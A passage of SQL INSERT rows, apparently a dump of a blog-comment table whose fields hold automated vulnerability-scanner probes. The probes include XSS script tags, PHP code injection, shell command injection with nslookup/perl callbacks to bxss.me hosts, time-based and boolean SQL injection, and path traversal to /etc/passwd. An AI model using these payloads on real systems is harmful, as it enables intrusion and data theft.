(159, 12, 'e', 'http://bxss.me/t/fit.txt?.tst', 'e', 0, '2020-09-14 11:08:53', 3),
(160, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:53', 3),
(161, 12, 'e', 'sample@email.tst', 'blogcomment_save', 0, '2020-09-14 11:08:54', 3),
(162, 12, 'e', '\'.print(md5(31337)).\'', 'e', 0, '2020-09-14 11:08:55', 3),
(163, 12, 'e', 'sample@email.tst', 'e\'\"()&%<acx><ScRiPt >dDcX(9894)</ScRiPt>', 0, '2020-09-14 11:08:55', 3),
(164, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:55', 3),
(165, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:56', 3),
(166, 12, 'e', 'bxss.me', 'e', 0, '2020-09-14 11:08:56', 3),
(167, 12, 'e', 'sample@email.tst', 'blogcomment_save', 0, '2020-09-14 11:08:57', 3),
(168, 12, ';print(md5(31337));', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:57', 3),
(169, 12, 'e', 'sample@email.tst', '\'\"()&%<acx><ScRiPt >dDcX(9404)</ScRiPt>', 0, '2020-09-14 11:08:57', 3),
(170, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:57', 3),
(171, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:58', 3),
(172, 12, 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', 'sample@email.tst', 'e', 0, '2020-09-14 11:08:59', 3),
(173, 12, 'e', 'sample@email.tst', 'blogcomment_save/.', 0, '2020-09-14 11:08:59', 3),
(174, -1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:00', 3),
(175, 12, 'e', 'sample@email.tst', 'e9888607', 0, '2020-09-14 11:09:00', 3),
(176, 12, '\';print(md5(31337));$a=\'', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:00', 3),
(177, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:00', 3),
(178, 12, '1some_inexistent_file_with_long_name.jpg', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:01', 3),
(179, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:02', 3),
(180, 12, '\";print(md5(31337));$a=\"', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:02', 3),
(181, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:02', 3),
(182, -1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:02', 3),
(183, 12, 'e', 'echo sinixo$()\\ lyiqsv\\nz^xyu||a #\' &echo sinixo$()\\ lyiqsv\\nz^xyu||a #|\" &echo sinixo$()\\ lyiqsv\\nz^xyu||a #', 'e', 0, '2020-09-14 11:09:03', 3),
(184, 12, 'Http://bxss.me/t/fit.txt', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:04', 3),
(185, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:04', 3),
(186, 12, '${@print(md5(31337))}', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:04', 3),
(187, 1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:05', 3),
(188, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:05', 3),
(189, 12, 'e', '&echo yfxqqy$()\\ xkmhqa\\nz^xyu||a #\' &echo yfxqqy$()\\ xkmhqa\\nz^xyu||a #|\" &echo yfxqqy$()\\ xkmhqa\\nz^xyu||a #', 'e', 0, '2020-09-14 11:09:06', 3),
(190, 12, 'http://bxss.me/t/fit.txt?.jpg', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:06', 3),
(191, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:07', 3),
(192, 12, '${@print(md5(31337))}\\', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:07', 3),
(193, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:07', 3),
(194, 129037507, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:08', 3),
(195, 12, 'e', '|echo rlpxlr$()\\ grybja\\nz^xyu||a #\' |echo rlpxlr$()\\ grybja\\nz^xyu||a #|\" |echo rlpxlr$()\\ grybja\\nz^xyu||a #', 'e', 0, '2020-09-14 11:09:08', 3),
(196, 12, 'bxss.me', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:09', 3),
(197, 12, 'e', 'blogcomment_save', 'e', 0, '2020-09-14 11:09:09', 3),
(198, 12, '\'.print(md5(31337)).\'', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:09', 3),
(199, -5, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:10', 3),
(200, 12, 'e', 'sample@email.tst\'\"()&%<acx><ScRiPt >dDcX(9896)</ScRiPt>', 'e', 0, '2020-09-14 11:09:11', 3),
(201, 12, 'e', '(nslookup hitcylsoqjepu73951.bxss.me||perl -e \"gethostbyname(\'hitcylsoqjepu73951.bxss.me\')\")', 'e', 0, '2020-09-14 11:09:11', 3),
(202, 12, 'e', 'blogcomment_save', 'e', 0, '2020-09-14 11:09:12', 3),
(203, -5, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:12', 3),
(204, 12, 'e', '\'\"()&%<acx><ScRiPt >dDcX(9374)</ScRiPt>', 'e', 0, '2020-09-14 11:09:12', 3),
(205, 12, 'e', '$(nslookup hitlwbhwloqjna865a.bxss.me||perl -e \"gethostbyname(\'hitlwbhwloqjna865a.bxss.me\')\")', 'e', 0, '2020-09-14 11:09:12', 3),
(206, 12, 'e', 'blogcomment_save/.', 'e', 0, '2020-09-14 11:09:14', 3),
(207, -1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:15', 3),
(208, 12, 'e', 'sample@email.tst9169612', 'e', 0, '2020-09-14 11:09:15', 3),
(209, 12, 'e', '&(nslookup hittwahogcamt178b0.bxss.me||perl -e \"gethostbyname(\'hittwahogcamt178b0.bxss.me\')\")&\'\\\"`0&(nslookup hittwahogcamt178b0.bxss.me||perl -e \"gethostbyname(\'hittwahogcamt178b0.bxss.me\')\")&`\'', 'e', 0, '2020-09-14 11:09:15', 3),
(210, 12, 'blogcomment_save', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:16', 3),
(211, 12, 'e\'\"()&%<acx><ScRiPt >dDcX(9377)</ScRiPt>', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:17', 3),
(212, 12, 'e', '|(nslookup hitvapikmfote11db3.bxss.me||perl -e \"gethostbyname(\'hitvapikmfote11db3.bxss.me\')\")', 'e', 0, '2020-09-14 11:09:17', 3),
(213, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:17', 3),
(214, 12, 'blogcomment_save', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:19', 3),
(215, 12, '\'\"()&%<acx><ScRiPt >dDcX(9320)</ScRiPt>', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:19', 3),
(216, 12, 'e', '`(nslookup hitpzlgmdpssab3c45.bxss.me||perl -e \"gethostbyname(\'hitpzlgmdpssab3c45.bxss.me\')\")`', 'e', 0, '2020-09-14 11:09:20', 3),
(217, 0, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:20', 3),
(218, 12, 'blogcomment_save/.', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:22', 3),
(219, 12, 'e9957566', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:22', 3),
(220, 12, 'e', ';(nslookup hitrbepwhidjg11e9d.bxss.me||perl -e \"gethostbyname(\'hitrbepwhidjg11e9d.bxss.me\')\")|(nslookup hitrbepwhidjg11e9d.bxss.me||perl -e \"gethostbyname(\'hitrbepwhidjg11e9d.bxss.me\')\")&(nslookup hitrbepwhidjg11e9d.bxss.me||perl -e \"gethostbyname(\'hitrbepwhidjg11e9d.bxss.me\')\")', 'e', 0, '2020-09-14 11:09:23', 3),
(221, 1, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:23', 3),
(222, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:25', 3),
(223, 12, 'echo hmsitx$()\\ lklxbp\\nz^xyu||a #\' &echo hmsitx$()\\ lklxbp\\nz^xyu||a #|\" &echo hmsitx$()\\ lklxbp\\nz^xyu||a #', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:25', 3),
(224, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:27', 3),
(225, 12, '&echo gvrtgw$()\\ zricxg\\nz^xyu||a #\' &echo gvrtgw$()\\ zricxg\\nz^xyu||a #|\" &echo gvrtgw$()\\ zricxg\\nz^xyu||a #', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:28', 3),
(226, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:30', 3),
(227, 12, '|echo qnfhvd$()\\ dpoztp\\nz^xyu||a #\' |echo qnfhvd$()\\ dpoztp\\nz^xyu||a #|\" |echo qnfhvd$()\\ dpoztp\\nz^xyu||a #', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:30', 3),
(228, 12, '(nslookup hitwuowilmxync566a.bxss.me||perl -e \"gethostbyname(\'hitwuowilmxync566a.bxss.me\')\")', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:32', 3),
(229, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:32', 3),
(230, 12, '$(nslookup hitxomwnslzeq9e303.bxss.me||perl -e \"gethostbyname(\'hitxomwnslzeq9e303.bxss.me\')\")', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:34', 3),
(231, 12, 'e', 'WxBJHRlo', 'e', 0, '2020-09-14 11:09:35', 3),
(232, 12, '&(nslookup hitpbpsmykxrg12f2f.bxss.me||perl -e \"gethostbyname(\'hitpbpsmykxrg12f2f.bxss.me\')\")&\'\\\"`0&(nslookup hitpbpsmykxrg12f2f.bxss.me||perl -e \"gethostbyname(\'hitpbpsmykxrg12f2f.bxss.me\')\")&`\'', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:36', 3),
(233, 12, 'e', '-1 OR 2+934-934-1=0+0+0+1 -- ', 'e', 0, '2020-09-14 11:09:37', 3),
(234, 12, '|(nslookup hitdibelbmjdpd8369.bxss.me||perl -e \"gethostbyname(\'hitdibelbmjdpd8369.bxss.me\')\")', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:38', 3),
(235, 12, 'e', '-1 OR 2+799-799-1=0+0+0+1', 'e', 0, '2020-09-14 11:09:39', 3),
(236, 12, '`(nslookup hitnfzcejcvycf2f4f.bxss.me||perl -e \"gethostbyname(\'hitnfzcejcvycf2f4f.bxss.me\')\")`', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:40', 3),
(237, 12, 'e', '-1\' OR 2+260-260-1=0+0+0+1 -- ', 'e', 0, '2020-09-14 11:09:41', 3),
(238, 12, ';(nslookup hitcunflwiymt5d70c.bxss.me||perl -e \"gethostbyname(\'hitcunflwiymt5d70c.bxss.me\')\")|(nslookup hitcunflwiymt5d70c.bxss.me||perl -e \"gethostbyname(\'hitcunflwiymt5d70c.bxss.me\')\")&(nslookup hitcunflwiymt5d70c.bxss.me||perl -e \"gethostbyname(\'hitcunflwiymt5d70c.bxss.me\')\")', 'sample@email.tst', 'e', 0, '2020-09-14 11:09:42', 3),
(239, 12, 'e', '-1\' OR 2+615-615-1=0+0+0+1 or \'R8h07ZCf\'=\'', 'e', 0, '2020-09-14 11:09:44', 3),
(240, 12, 'e', '-1\" OR 2+930-930-1=0+0+0+1 -- ', 'e', 0, '2020-09-14 11:09:45', 3),
(241, 12, 'e', '341\'', 'e', 0, '2020-09-14 11:09:48', 3),
(242, 12, 'e', 'if(now()=sysdate(),sleep(14),0)', 'e', 0, '2020-09-14 11:09:50', 3),
(243, 12, 'e', '0\'XOR(if(now()=sysdate(),sleep(14),0))XOR\'Z', 'e', 0, '2020-09-14 11:09:53', 3),
(244, 12, 'e', '0\"XOR(if(now()=sysdate(),sleep(14),0))XOR\"Z', 'e', 0, '2020-09-14 11:09:57', 3),
(245, 12, 'e', '(select(0)from(select(sleep(14)))v)/*\'+(select(0)from(select(sleep(14)))v)+\'\"+(select(0)from(select(sleep(14)))v)+\"*/', 'e', 0, '2020-09-14 11:10:00', 3),
(246, 12, 'e', '1 waitfor delay \'0:0:14\' -- ', 'e', 0, '2020-09-14 11:10:03', 3),
(247, 12, 'e', 'JkSKOQn1\'; waitfor delay \'0:0:14\' -- ', 'e', 0, '2020-09-14 11:10:05', 3),
(248, 12, 'e', 'kJVgjykP\' OR 564=(SELECT 564 FROM PG_SLEEP(14))--', 'e', 0, '2020-09-14 11:10:07', 3),
(249, 12, 'e', 'Kn79kjOU\') OR 575=(SELECT 575 FROM PG_SLEEP(14))--', 'e', 0, '2020-09-14 11:10:10', 3),
(250, 12, 'e', 'Hs5SD8ne\')) OR 63=(SELECT 63 FROM PG_SLEEP(14))--', 'e', 0, '2020-09-14 11:10:13', 3),
(251, 12, 'e', 'sample@email.tst\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),14)||\'', 'e', 0, '2020-09-14 11:10:16', 3),
(252, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:18', 3),
(253, 12, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:20', 3),
(254, 12, 'I3zFAeBk', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:24', 3),
(255, 12, '-1 OR 2+612-612-1=0+0+0+1 -- ', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:27', 3),
(256, 12, '-1 OR 2+816-816-1=0+0+0+1', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:29', 3),
(257, 12, '-1\' OR 2+66-66-1=0+0+0+1 -- ', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:32', 3),
(258, 12, '-1\' OR 2+610-610-1=0+0+0+1 or \'glgjGELC\'=\'', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:35', 3),
(259, 12, '-1\" OR 2+490-490-1=0+0+0+1 -- ', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:37', 3),
(260, 12, '670\'', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:42', 3),
(261, 12, 'if(now()=sysdate(),sleep(14),0)', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:42', 3),
(262, 12, '0\'XOR(if(now()=sysdate(),sleep(14),0))XOR\'Z', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:45', 3),
(263, 12, '0\"XOR(if(now()=sysdate(),sleep(14),0))XOR\"Z', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:47', 3),
(264, 12, '(select(0)from(select(sleep(14)))v)/*\'+(select(0)from(select(sleep(14)))v)+\'\"+(select(0)from(select(sleep(14)))v)+\"*/', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:50', 3),
(265, 12, '1 waitfor delay \'0:0:14\' -- ', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:53', 3),
(266, 12, 'uzlqldqB\'; waitfor delay \'0:0:14\' -- ', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:55', 3),
(267, 12, 'YWTW6aQB\' OR 511=(SELECT 511 FROM PG_SLEEP(14))--', 'sample@email.tst', 'e', 0, '2020-09-14 11:10:58', 3),
(268, 12, 'DlIsdZe9\') OR 754=(SELECT 754 FROM PG_SLEEP(14))--', 'sample@email.tst', 'e', 0, '2020-09-14 11:11:00', 3),
(269, 12, 'MRwgYLRC\')) OR 991=(SELECT 991 FROM PG_SLEEP(14))--', 'sample@email.tst', 'e', 0, '2020-09-14 11:11:02', 3),
(270, 12, 'e\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),14)||\'', 'sample@email.tst', 'e', 0, '2020-09-14 11:11:04', 3),
(271, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:00:17', 3),
(272, 15, 'e', 'sample@email.tst', '1\'\"', 0, '2020-09-14 12:07:09', 3),
(273, 15, 'e', 'sample@email.tst', '\\', 0, '2020-09-14 12:07:12', 3),
(274, 15, 'e', 'sample@email.tst', '1%2527%2522', 0, '2020-09-14 12:07:15', 3),
(275, 15, 'e', 'sample@email.tst', '@@NGvbf', 0, '2020-09-14 12:07:17', 3),
(276, 15, 'e', 'sample@email.tst', 'JyI=', 0, '2020-09-14 12:07:19', 3),
(277, 15, 'e', 'sample@email.tst', '\'\"', 0, '2020-09-14 12:07:22', 3),
(278, 15, 'e', 'sample@email.tst', '\'\'\"\"', 0, '2020-09-14 12:07:24', 3),
(279, 15, 'e', '1\'\"', 'e', 0, '2020-09-14 12:07:27', 3),
(280, 15, 'e', '\\', 'e', 0, '2020-09-14 12:07:29', 3),
(281, 15, 'e', '1%2527%2522', 'e', 0, '2020-09-14 12:07:31', 3),
(282, 15, 'e', '@@xXWhR', 'e', 0, '2020-09-14 12:07:34', 3),
(283, 15, 'e', 'JyI=', 'e', 0, '2020-09-14 12:07:36', 3),
(284, 15, 'e', '\'\"', 'e', 0, '2020-09-14 12:07:39', 3),
(285, 15, 'e', '\'\'\"\"', 'e', 0, '2020-09-14 12:07:41', 3),
(286, 15, '1\'\"', 'sample@email.tst', 'e', 0, '2020-09-14 12:07:43', 3),
(287, 15, '\\', 'sample@email.tst', 'e', 0, '2020-09-14 12:07:46', 3),
(288, 15, '1%2527%2522', 'sample@email.tst', 'e', 0, '2020-09-14 12:07:48', 3),
(289, 15, '@@p45AU', 'sample@email.tst', 'e', 0, '2020-09-14 12:07:50', 3),
(290, 15, 'JyI=', 'sample@email.tst', 'e', 0, '2020-09-14 12:07:53', 3),
(291, 15, '\'\"', 'sample@email.tst', 'e', 0, '2020-09-14 12:07:56', 3),
(292, 15, '\'\'\"\"', 'sample@email.tst', 'e', 0, '2020-09-14 12:07:58', 3),
(293, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:09:53', 3),
(294, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:09:55', 3),
(295, 15, 'e', 'sample@email.tst', '../../../../../../../../../../etc/passwd', 0, '2020-09-14 12:09:56', 3),
(296, 15, 'e', 'sample@email.tst', 'QNgvqnR0', 0, '2020-09-14 12:09:58', 3),
(297, 15, 'e', 'sample@email.tst', '../../../../../../../../../../windows/win.ini', 0, '2020-09-14 12:09:58', 3),
(298, 15, 'e', 'sample@email.tst', '-1 OR 2+526-526-1=0+0+0+1 -- ', 0, '2020-09-14 12:10:00', 3),
(299, 15, 'e', 'sample@email.tst', '${10000332+9999214}', 0, '2020-09-14 12:10:00', 3),
(300, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:01', 3),
(301, 15, 'e', 'sample@email.tst', '-1 OR 2+891-891-1=0+0+0+1', 0, '2020-09-14 12:10:02', 3),
(302, 15, 'e', '${10000079+10000160}', 'e', 0, '2020-09-14 12:10:02', 3),
(303, 15, 'e', 'sample@email.tst', 'HttP://bxss.me/t/xss.html?', 0, '2020-09-14 12:10:03', 3),
(304, 15, 'e', 'sample@email.tst', '-1\' OR 2+591-591-1=0+0+0+1 -- ', 0, '2020-09-14 12:10:04', 3),
(305, 15, 'e', 'sample@email.tst', '../e', 0, '2020-09-14 12:10:04', 3),
(306, 15, '${9999781+9999888}', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:04', 3),
(307, 15, 'e', 'sample@email.tst', '-1\' OR 2+379-379-1=0+0+0+1 or \'3KiXIrzE\'=\'', 0, '2020-09-14 12:10:06', 3),
(308, 15, 'e', 'sample@email.tst', 'bxss.me/t/xss.html?', 0, '2020-09-14 12:10:06', 3),
(309, 15, 'e', '../../../../../../../../../../etc/passwd', 'e', 0, '2020-09-14 12:10:06', 3),
(310, 15, 'e', 'sample@email.tst', ';print(md5(31337));', 0, '2020-09-14 12:10:08', 3),
(311, 15, 'e', 'sample@email.tst', '-1\" OR 2+825-825-1=0+0+0+1 -- ', 0, '2020-09-14 12:10:09', 3),
(312, 15, 'e', '../../../../../../../../../../windows/win.ini', 'e', 0, '2020-09-14 12:10:09', 3),
(313, 15, 'e', 'HttP://bxss.me/t/xss.html?', 'e', 0, '2020-09-14 12:10:09', 3),
(314, 15, 'e', 'sample@email.tst', '\';print(md5(31337));$a=\'', 0, '2020-09-14 12:10:10', 3),
(315, 15, 'e', 'sample@email.tst', ')', 0, '2020-09-14 12:10:10', 3),
(316, 15, 'e', 'sample@email.tst', '493\'', 0, '2020-09-14 12:10:11', 3),
(317, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:11', 3),
(318, 15, 'e', 'sample@email.tst', '\";print(md5(31337));$a=\"', 0, '2020-09-14 12:10:11', 3),
(319, 15, 'e', 'bxss.me/t/xss.html?', 'e', 0, '2020-09-14 12:10:12', 3),
(320, 15, 'e', 'sample@email.tst', '!(()&&!|*|*|', 0, '2020-09-14 12:10:13', 3),
(321, 15, 'e', 'sample@email.tst', 'if(now()=sysdate(),sleep(14),0)', 0, '2020-09-14 12:10:14', 3),
(322, 15, 'HttP://bxss.me/t/xss.html?', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:14', 3),
(323, 15, 'e', '../sample@email.tst', 'e', 0, '2020-09-14 12:10:14', 3),
(324, 15, 'e', 'sample@email.tst', '${@print(md5(31337))}', 0, '2020-09-14 12:10:15', 3),
(325, 15, 'e', 'sample@email.tst', '0\'XOR(if(now()=sysdate(),sleep(14),0))XOR\'Z', 0, '2020-09-14 12:10:16', 3),
(326, 15, 'bxss.me/t/xss.html?', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:16', 3),
(327, 15, 'e', 'sample@email.tst', '^(#$!@#$)(()))******', 0, '2020-09-14 12:10:16', 3),
(328, 15, 'e', 'sample@email.tst', '${@print(md5(31337))}\\', 0, '2020-09-14 12:10:17', 3),
(329, 15, '../../../../../../../../../../etc/passwd', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:17', 3),
(330, 15, 'e', ')', 'e', 0, '2020-09-14 12:10:18', 3),
(331, 15, 'e', 'sample@email.tst', 'echo oabsik$()\\ mjrtpq\\nz^xyu||a #\' &echo oabsik$()\\ mjrtpq\\nz^xyu||a #|\" &echo oabsik$()\\ mjrtpq\\nz^xyu||a #', 0, '2020-09-14 12:10:18', 3),
(332, 15, 'e', 'sample@email.tst', '0\"XOR(if(now()=sysdate(),sleep(14),0))XOR\"Z', 0, '2020-09-14 12:10:18', 3),
(333, 15, 'e', 'sample@email.tst', '\'.print(md5(31337)).\'', 0, '2020-09-14 12:10:19', 3),
(334, 15, '../../../../../../../../../../windows/win.ini', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:20', 3),
(335, 15, 'e', 'sample@email.tst', '&echo kddwmo$()\\ qptihg\\nz^xyu||a #\' &echo kddwmo$()\\ qptihg\\nz^xyu||a #|\" &echo kddwmo$()\\ qptihg\\nz^xyu||a #', 0, '2020-09-14 12:10:21', 3),
(336, 15, 'e', '!(()&&!|*|*|', 'e', 0, '2020-09-14 12:10:21', 3),
(337, 15, 'e', 'sample@email.tst', '(select(0)from(select(sleep(14)))v)/*\'+(select(0)from(select(sleep(14)))v)+\'\"+(select(0)from(select(sleep(14)))v)+\"*/', 0, '2020-09-14 12:10:21', 3),
(338, 15, 'e', ';print(md5(31337));', 'e', 0, '2020-09-14 12:10:22', 3),
(339, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:22', 3),
(340, 15, 'e', 'sample@email.tst', '1 waitfor delay \'0:0:14\' -- ', 0, '2020-09-14 12:10:23', 3),
(341, 15, 'e', '^(#$!@#$)(()))******', 'e', 0, '2020-09-14 12:10:23', 3),
(342, 15, 'e', 'sample@email.tst', '|echo fudodk$()\\ shptou\\nz^xyu||a #\' |echo fudodk$()\\ shptou\\nz^xyu||a #|\" |echo fudodk$()\\ shptou\\nz^xyu||a #', 0, '2020-09-14 12:10:24', 3),
(343, 15, 'e', '\';print(md5(31337));$a=\'', 'e', 0, '2020-09-14 12:10:24', 3),
(344, 15, '../e', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:24', 3),
(345, 15, 'e', 'sample@email.tst', 'KWUiv30v\'; waitfor delay \'0:0:14\' -- ', 0, '2020-09-14 12:10:26', 3),
(346, 15, ')', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:26', 3),
(347, 15, 'e', 'sample@email.tst', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', 0, '2020-09-14 12:10:27', 3),
(348, 15, 'e', 'sample@email.tst', '(nslookup hitoclhxwcskq76d11.bxss.me||perl -e \"gethostbyname(\'hitoclhxwcskq76d11.bxss.me\')\")', 0, '2020-09-14 12:10:27', 3),
(349, 15, 'e', '\";print(md5(31337));$a=\"', 'e', 0, '2020-09-14 12:10:27', 3),
(350, 15, 'e', 'sample@email.tst', '4f3OnKhM\' OR 830=(SELECT 830 FROM PG_SLEEP(14))--', 0, '2020-09-14 12:10:28', 3),
(351, 15, '!(()&&!|*|*|', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:29', 3),
(352, 15, 'e', 'sample@email.tst', '$(nslookup hitcrcxslyyay46012.bxss.me||perl -e \"gethostbyname(\'hitcrcxslyyay46012.bxss.me\')\")', 0, '2020-09-14 12:10:29', 3),
(353, 15, 'e', '${@print(md5(31337))}', 'e', 0, '2020-09-14 12:10:29', 3),
(354, 15, 'e', 'sample@email.tst', '1some_inexistent_file_with_long_name.jpg', 0, '2020-09-14 12:10:30', 3),
(355, 15, 'e', 'sample@email.tst', 'u3b2ICck\') OR 719=(SELECT 719 FROM PG_SLEEP(14))--', 0, '2020-09-14 12:10:31', 3),
(356, 15, '^(#$!@#$)(()))******', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:32', 3),
(357, 15, 'e', 'sample@email.tst', '&(nslookup hitvyxwmemvljb8021.bxss.me||perl -e \"gethostbyname(\'hitvyxwmemvljb8021.bxss.me\')\")&\'\\\"`0&(nslookup hitvyxwmemvljb8021.bxss.me||perl -e \"gethostbyname(\'hitvyxwmemvljb8021.bxss.me\')\")&`\'', 0, '2020-09-14 12:10:32', 3),
(358, 15, 'e', 'sample@email.tst', 'Http://bxss.me/t/fit.txt', 0, '2020-09-14 12:10:32', 3),
(359, 15, 'e', '${@print(md5(31337))}\\', 'e', 0, '2020-09-14 12:10:32', 3),
(360, 15, 'e', 'sample@email.tst', 'lcctg63w\')) OR 701=(SELECT 701 FROM PG_SLEEP(14))--', 0, '2020-09-14 12:10:33', 3),
(361, 15, 'e', 'sample@email.tst', '|(nslookup hitgwnllnwgqtb5c9d.bxss.me||perl -e \"gethostbyname(\'hitgwnllnwgqtb5c9d.bxss.me\')\")', 0, '2020-09-14 12:10:34', 3),
(362, 15, 'e', 'sample@email.tst', 'http://bxss.me/t/fit.txt?.jpg', 0, '2020-09-14 12:10:35', 3),
(363, 15, 'e', '\'.print(md5(31337)).\'', 'e', 0, '2020-09-14 12:10:35', 3),
(364, 15, 'e', 'sample@email.tst', '`(nslookup hittpjzcxoddge10c9.bxss.me||perl -e \"gethostbyname(\'hittpjzcxoddge10c9.bxss.me\')\")`', 0, '2020-09-14 12:10:36', 3),
(365, 15, 'e', 'sample@email.tst', 'bxss.me', 0, '2020-09-14 12:10:37', 3),
(366, 15, ';print(md5(31337));', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:37', 3),
(367, 15, 'e', 'sample@email.tst', ';(nslookup hitvreatenakyc70ea.bxss.me||perl -e \"gethostbyname(\'hitvreatenakyc70ea.bxss.me\')\")|(nslookup hitvreatenakyc70ea.bxss.me||perl -e \"gethostbyname(\'hitvreatenakyc70ea.bxss.me\')\")&(nslookup hitvreatenakyc70ea.bxss.me||perl -e \"gethostbyname(\'hitvreatenakyc70ea.bxss.me\')\")', 0, '2020-09-14 12:10:38', 3),
(368, 15, 'e', 'sample@email.tst', 'e\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),14)||\'', 0, '2020-09-14 12:10:38', 3),
(369, 15, 'e', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.tst', 'e', 0, '2020-09-14 12:10:39', 3),
(370, 15, '\';print(md5(31337));$a=\'', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:39', 3),
(371, 15, 'e', 'echo rdqsco$()\\ oyztju\\nz^xyu||a #\' &echo rdqsco$()\\ oyztju\\nz^xyu||a #|\" &echo rdqsco$()\\ oyztju\\nz^xyu||a #', 'e', 0, '2020-09-14 12:10:40', 3),
(372, 15, 'e', '1some_inexistent_file_with_long_name.tst', 'e', 0, '2020-09-14 12:10:41', 3),
(373, 15, '\";print(md5(31337));$a=\"', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:42', 3),
(374, 15, 'e', '&echo nzreln$()\\ mhnlbk\\nz^xyu||a #\' &echo nzreln$()\\ mhnlbk\\nz^xyu||a #|\" &echo nzreln$()\\ mhnlbk\\nz^xyu||a #', 'e', 0, '2020-09-14 12:10:42', 3),
(375, 15, 'e', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:42', 3),
(376, 15, 'e', 'Http://bxss.me/t/fit.txt', 'e', 0, '2020-09-14 12:10:44', 3),
(377, 15, '${@print(md5(31337))}', 'sample@email.tst', 'e', 0, '2020-09-14 12:10:44', 3),
(378, 15, 'e', '|echo ohmwbn$()\\ goemae\\nz^xyu||a #\' |echo ohmwbn$()\\ goemae\\nz^xyu||a #|\" |echo ohmwbn$()\\ goemae\\nz^xyu||a #', 'e', 0, '2020-09-14 12:10:45', 3),
(379, 15, 'e', 'http://bxss.me/t/fit.txt?.tst', 'e', 0, '2020-09-14 12:10:46', 3),
